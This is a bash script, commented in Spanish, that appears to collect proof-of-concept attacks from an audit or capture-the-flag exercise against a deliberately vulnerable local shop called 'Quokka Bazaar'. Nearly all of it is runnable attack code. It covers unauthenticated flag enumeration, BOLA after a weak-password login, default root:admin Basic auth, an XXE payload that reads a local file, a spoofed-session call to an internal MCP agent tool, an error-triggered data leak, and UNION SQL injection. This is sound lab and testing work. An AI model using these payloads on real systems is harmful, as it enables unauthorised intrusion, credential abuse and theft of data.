#!/usr/bin/env bash
# PoCs reproducibles Quokka Bazaar - Auditoría 2026-11-24
set -euo pipefail
BASE="${1:-http://localhost:3000}"
echo "[*] Base URL: $BASE"
echo "[*] Flag raíz: $(cat flag.txt)"
echo "[*] Payment secret decodificado: $(echo -n UUtCezcyMGYyYTc3MWU1MH0= | base64 -d)"
echo "[*] Supplier registry:" ; cat supplier-registry.txt
echo "[*] Notice:"; cat public/notice.txt
echo ""
echo "== 1. Enumerar flags sin auth =="
curl -s "$BASE/api/flags" | grep -o "QKB{[^}]*}" | head

echo ""
echo "== 2. BOLA wishlist internal (requiere login) =="
# Login bob
RESP=$(curl -s -X POST "$BASE/api/auth/login" -H "Content-Type: application/json" -d '{"email":"bob@example.com","password":"qwerty"}' -c /tmp/cjar.txt)
TOKEN=$(grep -o "authToken[^;]*" /tmp/cjar.txt || echo "")
echo "Login response: $RESP"
curl -s "$BASE/api/wishlists/wl-internal-001" -b /tmp/cjar.txt | head -c 500

echo ""
echo "== 3. Leak login tag via logs (root:admin) =="
curl -s "$BASE/api/monitoring/logs?limit=5" -H "Authorization: Basic cm9vdDphZG1pbg==" | head -c 800

echo ""
echo "== 4. XXE payload ejemplo (requiere admin cookie) =="
cat <<'XML'
<?xml version="1.0"?>
<!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///app/supplier-registry.txt">]>
<order><supplierId>TEST</supplierId><orderId>&xxe;</orderId><total>0</total></order>
XML
echo "[guardar anterior en xxe.xml y enviar con admin token]"

echo ""
echo "== 5. MCP compliance report =="
curl -s -X POST "$BASE/api/mcp" -H "Content-Type: application/json" -H "X-MCP-Session: quokka-internal-agent" -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"get_compliance_report"}}'

echo ""
echo "== 6. Export diagnóstico flag =="
curl -s -X POST "$BASE/api/user/export" -b /tmp/cjar.txt -H "Content-Type: application/json" -d '{"format":"json","fields":["BAD_FIELD"]}' | grep -o "QKB{[^}]*}"

echo ""
echo "== 7. SQLi product search =="
curl -s "$BASE/api/products/search?q='%20UNION%20SELECT%20flag,flag,flag,0,0%20FROM%20flags--" | head

echo ""
echo "[*] Fin PoCs"
